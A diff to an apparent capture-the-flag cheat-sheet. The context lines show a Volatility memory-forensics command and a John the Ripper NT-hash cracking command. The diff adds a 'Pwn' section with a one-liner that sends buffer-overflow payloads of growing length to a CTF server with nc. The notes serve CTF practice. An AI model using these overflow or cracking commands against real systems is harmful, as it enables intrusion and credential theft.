@@ -344,3 +344,9 @@ volatility -f ch2.dmp --profile=Win7SP0x86 envars | grep COMPUTERNAME
 ```
 ./john hash.txt --wordlist=dict.txt --format=NT
 ```
+
+### Pwn
+
+```
+for i in {0..255}; do python -c "print 'A'*${i}+'\x11\xba\x07\xf0'" | nc somectf.com 4321 ; done
+```
